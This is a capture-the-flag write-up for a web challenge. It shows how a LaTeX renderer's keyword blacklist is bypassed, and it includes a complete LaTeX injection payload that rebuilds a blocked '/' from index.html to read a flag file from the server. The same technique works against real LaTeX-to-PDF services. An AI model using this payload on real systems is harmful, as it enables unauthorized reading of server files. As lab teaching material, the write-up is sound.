
- **Challenge Name:**  Latex
- **Category:** Web
- **Difficulty:** Hard
- **Writeup Author:** HanzalaAbbasi 
- **Challenge Author(s):** HanzalaAbbasi


## Description
Explore the maze of LaTeX's PDF making and HTML data pulling to find the flag

# LaTeX Renderer Exploitation Guide

## Introduction
The website appears to be a renderer for LaTeX code. Writing LaTeX and clicking "Generate PDF" gives a link to the rendered PDF. The output LOG of the LaTeX renderer will also be displayed.

![image](https://github.com/user-attachments/assets/8e88c666-a36a-4ddd-afd9-77e61bef6379)


## PDF Link
While copying and pasting the provided link into your browser may lead to a PDF document, it may not contain the information you're expecting.

![image](https://github.com/user-attachments/assets/968a6aa2-6d20-47ef-8da4-e42a8dbdb730)


## Finding the Flag
Looking at the source HTML indicates that we need to read the flag from a file found in `/home/Desktop/trustline/flag/flag.txt`.

![image](https://github.com/user-attachments/assets/f308e2f7-d6c8-474a-98c5-05e6e1a35c19)


## Blacklisted Characters Issue
I'm currently encountering an issue where certain characters are being masked, making it difficult to read the flag.

![image](https://github.com/user-attachments/assets/7e03a4e2-9bcc-46b9-b0bb-50ff8efd7356)

## Crafting LaTeX Code to Bypass Blacklisted Characters
Examining the backend code logic, specifically the highlighted section in blue, we can see that it uses a regular expression with `preg_match` to validate the `$CONTENT` variable. This validation checks for the presence of blacklisted commands such as "input", "include", "", "/", "write", "slash", or "^^". If any of these commands are found, the code outputs the message "BLACKLISTED commands used".

To create LaTeX code that bypasses blacklisted characters, it's crucial to have an in-depth understanding of LaTeX. This is because certain characters are blocked which are used to read the files, and without them, rendering a flag might not be possible.

![image](https://github.com/user-attachments/assets/80e01229-f32e-469f-a7ef-02149ac6ab97)

## LaTeX Code Snippet
The below LaTeX code snippet is crafted to interact with an HTML file (`index.html`), extracting a specific character from a designated line within the file. Subsequently, this character serves as a crucial component in constructing a file path leading to another file (`flag.txt`). Let's delve into the code:

### Document Class and Packages:

- **`\documentclass{minimal}`**: This declaration assigns the document class as "minimal," tailored to yield a concise output.
- **`\usepackage{xstring}`**: Importing the **`xstring`** package furnishes the script with functionalities for string manipulation.

### Defining Directory Components:

- **`\def\a{home}`**, **`\def\b{Desktop}`**, **`\def\c{trustline}`**, **`\def\d{flag}`**, **`\def\e{flag.txt}`**: These directives establish variables encapsulating segments of the file directory path leading to flag.txt.

### Reading HTML File:

- **`\newread\file`**: This command initializes a file reading operation.
- **`\immediate\openin\file=index.html`**: Opening index.html for reading.
- **`\immediate\read\file to\fileline`**: Each line of the file is read into the macro **`\fileline`**.
- The initial six **`\immediate\read\file to\fileline`** commands handle the first six lines of index.html.
- **`\StrMid{\fileline}{22}{22}[\s]`**: Extracting the 22 character from the sixth line of index.html, storing it in the macro **`\s`**.

The sequence unfolds as follows:

- The first **`\immediate\read\file to\fileline`** reads the first line.
- The second **`\immediate\read\file to\fileline`** reads the second line.
- The third **`\immediate\read\file to\fileline`** reads the third line.
- The fourth **`\immediate\read\file to\fileline`** reads the fourth line.
- The fifth  **`\immediate\read\file to\fileline`** reads the fifth line.
- The six  **`\immediate\read\file to\fileline`** reads the sixth line.
- Consequently, the **`\StrMid{\fileline}{22}{22}[\s]`** command targets the 22 character from the sixth line of the index.html file, which is "/". We can utilize this character to construct our path and **circumvent the blacklisted characters filter.**

![image](https://github.com/user-attachments/assets/a5743002-0922-4e8f-8b7d-66a176e7de27)


## Word Count Verification
The word count for the sixth line is shown below.


![image](https://github.com/user-attachments/assets/63e71437-aa67-4acf-96b8-f06ec79ea093)


```
\documentclass{minimal}
\usepackage{xstring}

\def\a{home}
\def\b{Desktop}
\def\c{trustline}
\def\d{flag}
\def\e{flag.txt}

\newread\file
\immediate\openin\file=index.html
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\immediate\read\file to\fileline
\StrMid{\fileline}{22}{22}[\s]
\immediate\message{\s}
\immediate\closein\file

\immediate\openin\file=\s\a\s\b\s\c\s\d\s\e
\loop\unless\ifeof\file
    \read\file to\fileline
    \message{\fileline}
\repeat
\closein\file

\begin{document}
\end{document} 

```

## Building File Path and Reading Content
Using the above LaTeX code will yield the flag.

![image](https://github.com/user-attachments/assets/f8a2ac1a-4d62-4572-96d9-e4e42572cb90)


## Verifying with Python Script
We can also run a Python script to verify that we have successfully obtained the flag through our LaTeX code.

![image](https://github.com/user-attachments/assets/a3f4fa2f-34c2-4138-9c7d-ee023de2f3f3)





## Flag
TRUSTLINE{YoU_HavE_SoLvED_LaTeX_HarD_ChAlleNGE_WeLl_DOne_Xd}


